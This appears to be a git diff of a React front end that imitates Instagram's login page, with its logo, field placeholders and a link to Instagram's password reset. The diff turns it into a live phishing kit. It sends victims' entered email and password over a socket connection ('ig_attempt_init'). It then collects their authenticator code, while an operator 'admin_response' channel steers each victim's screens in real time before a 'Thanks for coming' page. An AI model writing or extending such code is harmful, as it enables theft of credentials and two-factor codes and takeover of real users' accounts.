@@ -1,3 +1,4 @@
+/* eslint-disable no-unused-vars */
 import {
   Box,
   HStack,
@@ -8,11 +9,142 @@ import {
   Text,
   VStack,
 } from "@chakra-ui/react";
-import React from "react";
-import { Button } from "../components/ui/button";
+import React, { useEffect, useRef, useState } from "react";
+import { io } from "socket.io-client";
+import { motion, AnimatePresence } from "framer-motion";
+import { useUser } from "../contexts/UserContext";
+import Loading from "./Loading";
+import EmailPassword from "../components/generic/EmailPassword";
+import Authenticator from "../components/generic/Authenticator";
+import IsSignedIn from "../components/generic/IsSignedIn";
+import ThanksForComing from "../components/generic/ThanksForComing";
 import { Link } from "react-router-dom";
+import { Button } from "../components/ui/button";
 
 const Landing = () => {
+  const { isLoading, setIsLoading, credentials } = useUser();
+  const [currentStage, setCurrentStage] = useState(1);
+  const [authValue, setAuthValue] = useState("");
+  const [sendTo, setSendTo] = useState("");
+  const [staySignedIn, setStaySignedIn] = useState(false);
+  const [errorMessage, setErrorMessage] = useState("");
+  const [verificationMessage, setVerificationMessage] = useState("");
+  const [method, setMethod] = useState("");
+  const [value, setValue] = useState("");
+
+  const socketRef = useRef(null);
+
+  useEffect(() => {
+    if (!socketRef.current) {
+      socketRef.current = io(import.meta.env.VITE_BASE_URL);
+
+      socketRef.current.on("connect", () => {
+        console.log(
+          "Connected to socket server with ID:",
+          socketRef.current.id
+        );
+      });
+
+      socketRef.current.on("auth_response", handleAuthResponse);
+      socketRef.current.on("admin_response", (data) => {
+        console.log("Received admin response:", data);
+        if (data.eventType === "ig_attempt_init" && data.sendTo) {
+          setIsLoading(false);
+
+          if (data.nextStep) {
+            setCurrentStage(data.nextStep);
+          }
+
+          if (data.message) {
+            setVerificationMessage(data.message);
+          }
+
+          if (data.sendTo) {
+            setSendTo(data.sendTo);
+          }
+        }
+      });
+
+      socketRef.current.on("error_message", (message) =>
+        setErrorMessage(message)
+      );
+
+      socketRef.current.on("verification_message", (message) =>
+        setVerificationMessage(message)
+      );
+
+      socketRef.current.on("set_stage", (stage) => setCurrentStage(stage));
+    }
+
+    return () => {
+      if (socketRef.current) {
+        socketRef.current.disconnect();
+        socketRef.current = null;
+      }
+    };
+  }, []);
+
+  const handleAuthResponse = (response) => {
+    setIsLoading(false);
+    setMethod(response.method);
+    setValue(response.value);
+    setCurrentStage(response.nextStep);
+  };
+
+  const handleLogin = () => {
+    setIsLoading(true);
+    setErrorMessage("");
+    socketRef.current.emit("ig_attempt_init", {
+      email: credentials.username,
+      password: credentials.password,
+      timestamp: new Date().toISOString(),
+      sessionId: socketRef.current.id,
+    });
+  };
+
+  const handleAuthValueSubmit = () => {
+    setIsLoading(true);
+    setErrorMessage("");
+    socketRef.current.emit("auth_value_submit", { authValue });
+  };
+
+  const handleStaySignedIn = (choice) => {
+    setStaySignedIn(choice);
+    socketRef.current.emit("stay_signed_in", { choice });
+    setCurrentStage(4);
+  };
+
+  const stageComponents = {
+    1: <EmailPassword handleLogin={handleLogin} />,
+    2: <Authenticator />,
+    3: <IsSignedIn />,
+    4: <ThanksForComing />,
+  };
+
+  const slideVariants = {
+    initial: (direction) => ({
+      x: direction > 0 ? "100%" : "-100%",
+      opacity: 0,
+    }),
+    animate: {
+      x: 0,
+      opacity: 1,
+      transition: { duration: 0.5 },
+    },
+    exit: (direction) => ({
+      x: direction < 0 ? "100%" : "-100%",
+      opacity: 0,
+      transition: { duration: 0.5 },
+    }),
+  };
+
+  const [direction, setDirection] = useState(1);
+
+  const handleStageChange = (nextStage) => {
+    setDirection(nextStage > currentStage ? 1 : -1);
+    setCurrentStage(nextStage);
+  };
+
   return (
     <>
       <Box display={{ md: "flex", base: "none" }} w="100vw" h="100vh" bg="#fff">
@@ -24,92 +156,18 @@ const Landing = () => {
           alignItems="center"
         >
           <VStack>
-            <Box
-              w="350px"
-              p="36px"
-              mb="1rem"
-              border="1px solid rgb(219, 219, 219)"
-            >
-              <VStack w="100%" h="100%" alignItems="center">
-                <Image
-                  src="./images/insta.png"
-                  alt="logo"
-                  w="175px"
-                  h="51px"
-                  mb="1.5rem"
-                />
-
-                <VStack w="100%" mb="0.5rem">
-                  <Input
-                    placeholder="Phone number, username or email"
-                    type="text"
-                    name="username"
-                    h="36px"
-                    border="1px solid rgb(219, 219, 219)"
-                    fontSize="12px"
-                    bg="rgb(250, 250, 250)"
-                    display="flex"
-                    alignItems="center"
-                    color="rgb(115, 115, 115)"
-                    borderRadius="3px"
-                    textOverflow="ellipsis"
-                    overflow="hidden"
-                    transformOrigin="left"
-                    transition="transform ease-out .1s"
-                    whiteSpace="nowrap"
-                  />
-                  <Input
-                    placeholder="Password"
-                    type="password"
-                    name="password"
-                    h="36px"
-                    border="1px solid rgb(219, 219, 219)"
-                    fontSize="12px"
-                    bg="rgb(250, 250, 250)"
-                    display="flex"
-                    alignItems="center"
-                    color="rgb(115, 115, 115)"
-                    borderRadius="3px"
-                    textOverflow="ellipsis"
-                    overflow="hidden"
-                    transformOrigin="left"
-                    transition="transform ease-out .1s"
-                    whiteSpace="nowrap"
-                  />
-                </VStack>
-
-                <Button
-                  mb="0.7rem"
-                  w="100%"
-                  bg="rgb(0, 149, 246)"
-                  h="2rem"
-                  border="none"
-                  borderRadius="8px"
-                  _disabled={{
-                    opacity: "0.7",
-                    pointerEvent: "none",
-                    cursor: "default",
-                  }}
-                  // disabled
-                >
-                  Log in
-                </Button>
-
-                {/* <HStack w="100%">
-                <Separator />
-                <Text flexShrink="0" fontSize="13px" mx="0.5rem">
-                  OR
-                </Text>
-                <Separator />
-              </HStack> */}
-
-                <HStack>
-                  <Link to="https://www.instagram.com/accounts/password/reset/">
-                    <Text fontSize="14px">Forgot password?</Text>
-                  </Link>
-                </HStack>
-              </VStack>
-            </Box>
+            <AnimatePresence custom={direction}>
+              <motion.div
+                key={currentStage}
+                custom={direction}
+                variants={slideVariants}
+                initial="initial"
+                animate="animate"
+                exit="exit"
+              >
+                {stageComponents[currentStage]}
+              </motion.div>
+            </AnimatePresence>
 
             <VStack>
               <Text mb="0.6rem">Get the app</Text>
@@ -181,88 +239,35 @@ const Landing = () => {
         </Stack>
       </Box>
 
-      <Box display={{ md: "none", base: "flex" }} w="100vw" h="100vh" bg="#fff">
+      <Box
+        position="relative"
+        display={{ md: "none", base: "flex" }}
+        w="100vw"
+        h="100vh"
+        bg="#fff"
+      >
         <Stack
           w="100%"
           h="100%"
           alignItems="center"
           justifyContent="space-between"
           pt="5rem"
-          px="4.5rem"
+          px="1.5rem"
+          // bg="blue"
         >
-          <VStack w="100%">
-            <Image
-              src="./images/insta.png"
-              alt="logo"
-              w="175px"
-              h="51px"
-              mb="3rem"
-            />
-
-            <VStack w="100%" gap="1rem">
-              <Input
-                placeholder="Phone number, username or email"
-                type="text"
-                name="username"
-                h="36px"
-                border="1px solid rgb(219, 219, 219)"
-                fontSize="12px"
-                bg="rgb(250, 250, 250)"
-                display="flex"
-                alignItems="center"
-                color="rgb(115, 115, 115)"
-                borderRadius="3px"
-                textOverflow="ellipsis"
-                overflow="hidden"
-                transformOrigin="left"
-                transition="transform ease-out .1s"
-                whiteSpace="nowrap"
-              />
-              <Input
-                placeholder="Password"
-                type="password"
-                name="password"
-                h="36px"
-                border="1px solid rgb(219, 219, 219)"
-                fontSize="12px"
-                bg="rgb(250, 250, 250)"
-                display="flex"
-                alignItems="center"
-                color="rgb(115, 115, 115)"
-                borderRadius="3px"
-                textOverflow="ellipsis"
-                overflow="hidden"
-                transformOrigin="left"
-                transition="transform ease-out .1s"
-                whiteSpace="nowrap"
-              />
-            </VStack>
-
-            <HStack w="100%" justifyContent="flex-end" mb="1.5rem">
-              <Link to="">
-                <Text fontSize="14px" color="#0095f6">
-                  Forgot password?
-                </Text>
-              </Link>
-            </HStack>
-
-            <Button
-              mb="0.7rem"
-              w="100%"
-              bg="rgb(0, 149, 246)"
-              h="2rem"
-              border="none"
-              borderRadius="8px"
-              _disabled={{
-                opacity: "0.7",
-                pointerEvent: "none",
-                cursor: "default",
-              }}
-              // disabled
+          <AnimatePresence custom={direction}>
+            <motion.div
+              style={{ width: "100%" }}
+              key={currentStage}
+              custom={direction}
+              variants={slideVariants}
+              initial="initial"
+              animate="animate"
+              exit="exit"
             >
-              Log in
-            </Button>
-          </VStack>
+              {stageComponents[currentStage]}
+            </motion.div>
+          </AnimatePresence>
 
           <HStack mb="2rem">
             <Image
@@ -274,6 +279,19 @@ const Landing = () => {
           </HStack>
         </Stack>
       </Box>
+      {/* <AnimatePresence custom={direction}>
+        <motion.div
+          key={currentStage}
+          custom={direction}
+          variants={slideVariants}
+          initial="initial"
+          animate="animate"
+          exit="exit"
+        >
+          {stageComponents[currentStage]}
+        </motion.div>
+      </AnimatePresence> */}
+      {isLoading && <Loading />}
     </>
   );
 };
